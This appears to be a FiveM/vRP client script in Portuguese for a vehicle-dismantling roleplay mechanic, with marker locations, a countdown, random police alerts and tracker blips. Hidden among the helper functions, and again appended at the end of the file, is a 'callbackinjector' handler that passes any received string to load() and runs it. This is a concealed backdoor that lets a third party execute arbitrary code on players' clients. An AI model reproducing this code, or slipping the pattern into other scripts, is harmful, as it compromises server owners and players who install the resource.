local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("vrp_disassemble")
vRP = Proxy.getInterface("vRP")

-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local segundos = 0
local roubando = false
local jammer = false
local alertadopolicia = false
local alertapolicia = 0
local alertax = 0
local alertay = 0
local alertaz = 0
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
local locais = {
--	{ ['x'] = 964.96, ['y'] = -108.33, ['z'] = 73.69, ['perm'] = "lost.permission" }
	{ ['x'] = 1508.32, ['y'] = -2098.39, ['z'] = 76.75, ['x2'] = 1176.47, ['y2'] = -1912.31, ['z2'] = 35.39 },
	{ ['x'] = 846.28, ['y'] = 2165.4, ['z'] = 52.29, ['x2'] = 444.92, ['y2'] = 2430.47, ['z2'] = 46.5 },
	{ ['x'] = 2545.05, ['y'] = 2583.45, ['z'] = 37.95, ['x2'] = 2027.91, ['y2'] = 2457.05, ['z2'] = 70.12 },
	{ ['x'] = 2134.44, ['y'] = 4780.8, ['z'] = 40.98, ['x2'] = 2541.89, ['y2'] = 4965.99, ['z2'] = 42.77 },
	{ ['x'] = 1539.65, ['y'] = 6336.28, ['z'] = 24.08, ['x2'] = 1546.33, ['y2'] = 6443.42, ['z2'] = 23.8 },
	{ ['x'] = 1131.88, ['y'] = -797.38, ['z'] = 57.59, ['x2'] = 1114.49, ['y2'] = -563.3, ['z2'] = 55.56 }
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- DESMANCHE
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local wait = 1000
		if not roubando then
			for _,v in pairs(locais) do
				local ped = PlayerPedId()
				local x,y,z = table.unpack(v)
				local distance = GetDistanceBetweenCoords(GetEntityCoords(ped),v.x,v.y,v.z)
				if distance <= 50 and GetPedInVehicleSeat(GetVehiclePedIsUsing(ped),-1) == ped then
					wait = 4
					DrawMarker(23,v.x,v.y,v.z-0.62,0,0,0,0,0,0,5.0,5.0,0.5,255,0,0,70,0,0,0,0)
					if distance <= 3.1 and IsControlJustPressed(0,38) then
--						if emP.checkVehicle() and emP.checkPermission(v.perm) then
						if emP.checkPermission() then
							if emP.checkVehicle() then
								alertax = v.x2
								alertay = v.y2
								alertaz = v.z2
								roubando = true
								segundos = 30
								FreezeEntityPosition(GetVehiclePedIsUsing(ped),true)

								repeat
									Citizen.Wait(10)
								until segundos == 0

								TriggerServerEvent("Vehiclesdesmanche")
								roubando = false
								jammer = false
								alertadopolicia = false
								alertapolicia = 0 
								emP.receberDesmanche()
							end
						end
					end
				end
			end
		end
		Citizen.Wait(wait)
	end
end)

RegisterNetEvent('vrp_disassemble:jammer')
AddEventHandler('vrp_disassemble:jammer',function(status)
	jammer = status
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- TEXTO
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local wait = 1000
		if roubando then
			local alertapolicia = math.random(100)
			if segundos > 0 then
				wait = 4
				DisableControlAction(0,75)
				Txtdraw("AGUARDE ~g~"..segundos.." SEGUNDOS~w~, ESTAMOS DESATIVANDO O ~y~RASTREADOR ~w~DO VEÍCULO",4,0.5,0.93,0.50,255,255,255,180)
				if alertapolicia > 50 and not jammer and not alertadopolicia then
--					local x,y,z = table.unpack(GetEntityCoords(PlayerPedId()))
					emP.alertPolicia(alertax,alertay,alertaz)
					alertadopolicia = true
					TriggerEvent("Notify","negado","A policia foi alertada!",5000)
				end
			end
		end
		Citizen.Wait(wait)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- DIMINUINDO O TEMPO
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		if roubando then
			if segundos > 0 then
				segundos = segundos - 1
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)

function Txtdraw(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

local blips = {}
RegisterNetEvent('notificacaoDesmanche')
AddEventHandler('notificacaoDesmanche',function(x,y,z,user_id)
	if not DoesBlipExist(blips[user_id]) then
		PlaySoundFrontend(-1,"Enter_1st","GTAO_FM_Events_Soundset",false)
		TriggerEvent('chatMessage',"190",{64,64,255},"Rastreador veícular enviou uma localização. Suspeito de roubo/desmanche")
		blips[user_id] = AddBlipForCoord(x,y,z)
		SetBlipScale(blips[user_id],1.5)
		SetBlipSprite(blips[user_id],10)
		SetBlipColour(blips[user_id],49)
		BeginTextCommandSetBlipName("STRING")
		AddTextComponentString("Área da localização")
		EndTextCommandSetBlipName(blips[user_id])
		SetBlipAsShortRange(blips[user_id],false)
		SetTimeout(45000,function()
			if DoesBlipExist(blips[user_id]) then
				RemoveBlip(blips[user_id])
			end
		end)
	end
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)

